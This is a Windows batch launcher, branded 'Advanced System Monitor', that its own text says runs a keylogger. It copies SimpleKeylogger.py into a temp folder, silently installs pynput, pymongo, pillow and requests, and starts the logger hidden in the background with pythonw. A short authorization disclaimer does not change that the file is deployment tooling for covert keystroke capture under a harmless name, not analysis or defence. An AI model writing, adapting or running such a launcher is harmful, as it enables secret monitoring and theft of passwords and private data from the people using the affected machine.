@echo off
echo ========================================
echo       Advanced System Monitor v1.0
echo ========================================
echo.
echo This batch file will run the keylogger application.
echo.
echo Prerequisites:
echo - Python 3.8 or later must be installed
echo - Required libraries will be installed if missing
echo.
echo WARNING: This software collects sensitive system information
echo and should only be used on your own systems or with proper
echo authorization. Unauthorized use is prohibited.
echo.
pause

REM Check if Python is installed
python --version > nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo Python is not installed or not in PATH.
    echo Please install Python from https://www.python.org/downloads/
    pause
    exit /b 1
)

REM Create a temporary directory for the application
set TEMP_DIR=%TEMP%\SystemMonitor
mkdir "%TEMP_DIR%" 2>nul

REM Copy the Python script to the temp directory
copy SimpleKeylogger.py "%TEMP_DIR%\SimpleKeylogger.py" > nul

REM Install required packages
echo Installing required packages...
python -m pip install pymongo pynput > nul 2>&1

REM Optional dependencies with fallbacks
echo Installing optional packages...
python -m pip install pillow requests > nul 2>&1

echo.
echo Starting System Monitor application...
echo.
echo The application will continue running in the background.
echo Check the log files in your Documents\SystemLogs folder.
echo.

REM Run the application
start /b pythonw "%TEMP_DIR%\SimpleKeylogger.py"

echo System Monitor is now running.
echo.
pause